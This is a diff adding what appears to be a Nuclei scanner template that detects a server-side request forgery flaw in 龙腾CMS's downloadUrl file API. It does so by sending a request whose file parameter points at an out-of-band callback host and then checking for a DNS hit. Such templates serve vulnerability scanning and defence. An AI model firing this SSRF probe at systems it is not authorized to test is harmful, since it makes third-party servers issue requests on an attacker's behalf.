@@ -1,0 +1,25 @@
+id: ltcm-downloadurl-ssrf
+info:
+  name: "龙腾CMS downloadUrl 接口 SSRF 漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 龙腾CMS
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        GET /api/file/downloadUrl?file=http://{{reverse}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
